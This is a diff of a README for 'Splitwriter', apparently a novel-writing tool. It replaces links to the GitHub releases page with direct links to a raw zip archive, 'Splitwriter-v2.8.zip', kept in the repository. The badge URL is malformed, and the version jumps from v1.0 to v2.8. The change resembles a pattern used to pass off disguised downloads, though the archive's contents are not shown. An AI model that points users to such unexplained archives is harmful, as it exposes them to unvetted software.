@@ -6,7 +6,7 @@ Welcome to Splitwriter! This tool helps novelists organize their writing project
 
 ## 📦 Download Links
 
-[![Download Splitwriter](https://img.shields.io/badge/Download%20Splitwriter-v1.0-brightgreen.svg)](https://github.com/labieds/Splitwriter/releases)
+[![Download Splitwriter](https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip%https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip)](https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ To run Splitwriter, your system needs:
 
 ## 📥 Download & Install
 
-To download Splitwriter, visit this page: [Release Page](https://github.com/labieds/Splitwriter/releases). 
+To download Splitwriter, visit this page: [Release Page](https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip). 
 
 1. Click on the link above.
 2. Look for the latest version of Splitwriter. 
